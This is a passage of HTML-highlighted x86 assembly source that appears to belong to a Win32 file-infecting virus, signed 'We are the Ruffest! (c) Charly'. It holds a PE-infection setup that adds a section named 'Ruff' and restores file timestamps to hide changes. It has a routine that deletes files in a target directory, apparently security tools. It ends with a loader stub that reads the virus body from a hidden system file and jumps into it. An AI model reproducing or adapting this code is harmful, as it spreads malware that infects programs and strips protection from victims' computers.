</span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">     </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">__exit</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc5">__1</span><span class="sc0">
</span><span class="sc5">__bad_prog_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DeleteBadProg</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;edi= end of directory</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">curr_directory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">MAX_PATH</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sGetCurrentDirectory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sSetCurrentDirectory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">__exit</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">wfd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">mask</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sFindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;eax=handle</span><span class="sc0">
</span><span class="sc5">__delete_it</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">wfd.WFD_szFileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sDeleteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">wfd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sFindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">__delete_it</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">curr_directory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sSetCurrentDirectory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">old_addr</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;mb_addr   dd 0</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_fio.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_fioEx.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">  </span><span class="sc5">strings.asm</span><span class="sc0">
</span><span class="sc5">fcreate_time</span><span class="sc0">       </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fwrite_time</span><span class="sc0">       </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">faccess_time</span><span class="sc0">       </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filemaphandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filehandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">maphandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">obj_align</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">file_align</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">new_sec_head</span><span class="sc0">            </span><span class="sc5">section_header</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc12">'Ruff'</span><span class="sc4">,,,</span><span class="sc5">vir_size</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">pe_head</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sBeep</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Beep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sCreateProcess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGetLastError</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetLastError'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sTerminateProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TerminateProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sCreateFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sCloseHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sSetFilePointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sReadFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sWriteFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sCreateFileMappingA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sMapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sUnmapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGetFileSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sSetEndOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sDeleteFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DeleteFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGetProcAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGetModuleHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGetFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sSetFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sFindFirstFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sFindNextFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGetWindowsDirectory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sCreateToolhelp32Snapshot</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateToolhelp32Snapshot'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sSetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sProcess32First</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Process32First'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sProcess32Next</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Process32Next'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sModule32First</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Module32First'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sModule32Next</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Module32Next'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sWriteProcessMemory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteProcessMemory'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sReadProcessMemory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ReadProcessMemory'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sOpenProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'OpenProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sGlobalAlloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GlobalAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;                          ^end signature</span><span class="sc0">
</span><span class="sc1">;exe_mask db '*.exe',0</span><span class="sc0">
</span><span class="sc5">module</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc1">;выделить память</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">vir_size</span><span class="sc4">+</span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ga_addr</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;SHARED MODE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">GENERIC_READ</span><span class="sc0">          </span><span class="sc1">;access</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">_filename</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_cf_addr</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'RUFF'</span><span class="sc0">
</span><span class="sc1">;записать основное тело вируса туда</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">;ebx=allocated memory</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;overlapped stucture = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">_nobr</span><span class="sc0">                </span><span class="sc1">;number of bytes readen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">vir_size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">;ebx=allocated memory</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_rf_addr</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ch_addr</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">_filename</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_df_addr</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_cp_addr</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">main_body_jmp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;ebx=allocated memory</span><span class="sc0">
</span><span class="sc5">_cp_addr</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">cp_addr</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_nobr</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">nobr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_filename</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">swap_file</span><span class="sc0">
</span><span class="sc5">_cf_addr</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">cf_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;Createfilea</span><span class="sc0">
</span><span class="sc5">_ch_addr</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">ch_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;CloseHandle</span><span class="sc0">
</span><span class="sc5">_rf_addr</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">rf_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;readfile</span><span class="sc0">
</span><span class="sc5">_ga_addr</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">ga_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;globalalloc</span><span class="sc0">
</span><span class="sc5">_df_addr</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc4">+</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">df_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">module_size</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">module</span><span class="sc0">
</span><span class="sc5">coolmessage</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'We are the Ruffest !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'(c) Charly'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
